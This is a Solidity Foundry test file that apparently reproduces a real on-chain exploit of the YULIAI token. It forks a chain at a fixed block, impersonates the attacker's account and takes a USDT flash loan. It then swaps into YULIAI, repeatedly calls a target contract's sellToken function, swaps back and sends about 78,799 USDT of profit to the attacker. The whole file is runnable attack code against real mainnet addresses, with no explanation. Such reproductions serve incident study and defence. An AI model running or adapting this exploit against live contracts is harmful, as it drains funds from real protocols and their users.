
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 57432055;
    uint256 constant TX_TIMESTAMP = 1755072137;
    uint256 constant TX_BLOCK_NUMBER = 57432056;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 78799932076881681340252);
    }
}

contract OurAttack {



    function attack() external payable {
        _swapAttack();
    }

    function flashCallback() internal {
        _markCallback(0);
        IERC20Like(Addresses.USDT).approve(Addresses.A_1B81D6_EB14, type(uint256).max);
        uint256 usdtBalanceOfAttackAttackContract = IERC20Like(Addresses.USDT).balanceOf(address(this));
        {
            uint256 swapAmt = 200000000000000000000000;
            IContract_1B81D6_EB14(Addresses.A_1B81D6_EB14)
                .exactInputSingle(
                    Abi_exactInputSingle_Param0({
                        field0: Addresses.USDT,
                        field1: Addresses.YULIAI,
                        field2: 10000,
                        field3: address(this),
                        field4: 1755072237,
                        field5: swapAmt,
                        field6: 0,
                        field7: 0
                    })
                );
        }
        IERC20Like(Addresses.YULIAI).approve(Addresses.A_826232_6282, type(uint256).max);
        IERC20Like(Addresses.YULIAI).balanceOf(address(this));
        {
            {
                for (uint256 i = 0; i < 35; i++) {
                    try IContract_826232_6282(Addresses.A_826232_6282).sellToken{value: 250000000000000}(
                        95638810142121233859331
                    ) {}
                    catch {
                        break;
                    }
                }
            }
        }
        uint256 yuliaiApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.YULIAI).approve(Addresses.A_1B81D6_EB14, yuliaiApproveAllowance);
        IERC20Like(Addresses.YULIAI).balanceOf(address(this));
        {
            uint256 swapAmt = 15780403673450003586789793;
            IContract_1B81D6_EB14(Addresses.A_1B81D6_EB14)
                .exactInputSingle(
                    Abi_exactInputSingle_Param0({
                        field0: Addresses.YULIAI,
                        field1: Addresses.USDT,
                        field2: 10000,
                        field3: address(this),
                        field4: 1755072237,
                        field5: swapAmt,
                        field6: 0,
                        field7: 0
                    })
                );
        }
        IERC20Like(Addresses.USDT).approve(Addresses.A_8F73B6_5D8C, usdtBalanceOfAttackAttackContract);
    }

    function _swapAttack() internal {
        {
            bytes memory flashLoanProof =
                abi.encode(Addresses.YULIAI, Addresses.A_826232_6282, uint256(200000000000000000000000));
            IContract_8F73B6_5D8C(Addresses.A_8F73B6_5D8C)
                .flashLoan(Addresses.USDT, 200000000000000000000000, flashLoanProof);
        }
        uint256 usdtBalanceOfAttackAttackContract = IERC20Like(Addresses.USDT).balanceOf(address(this));
        uint256 usdtBalanceOfAttackAttackContract_2 = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, usdtBalanceOfAttackAttackContract_2);
    }

    receive() external payable {}

    function onMoolahFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        flashCallback();
        return;
    }

    function swap(address amount, address amount1, uint256 amount2) external payable {
        amount;
        amount1;
        amount2;
        _swapAttack();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_6F67 = 0x000000000000000000636F6e736F6c652e6c6f67;
    address internal constant A_078F3F_8A9A = 0x078F3F917c7355027a8388b7083B2199910c8A9a;
    address internal constant A_1B81D6_EB14 = 0x1b81D678ffb9C0263b24A97847620C99d213eB14;
    address internal constant attacker_eoa = 0x26F8BF8a772b8283Bc1Ef657d690c19e545ccc0d;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_826232_6282 = 0x8262325Bf1d8c3bE83EB99f5a74b8458Ebb96282;
    address internal constant A_8F73B6_5D8C = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant A_A687C7_1333 = 0xa687C7B3c2Cf6AdAEF0c4eDAB234c55b88e01333;
    address internal constant A_B048BB_5997 = 0xB048Bbc1Ee6b733FFfCFb9e9CeF7375518e25997;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attack_contract = 0xd6b9EE63C1c360d1ea3e4d15170d20638115fFAa;
    address internal constant YULIAI = 0xDF54ee636a308E8Eb89a69B6893efa3183C2c1B5;
}

struct Abi_exactInputSingle_Param0 {
    address field0;
    address field1;
    uint24 field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint256 field6;
    uint160 field7;
}

interface IContract_1B81D6_EB14 {
    function exactInputSingle(Abi_exactInputSingle_Param0 calldata) external returns (uint256);
}

interface IContract_826232_6282 {
    function sellToken(uint256) external payable;
}

interface IContract_8F73B6_5D8C {
    function flashLoan(address, uint256, bytes calldata) external;
}
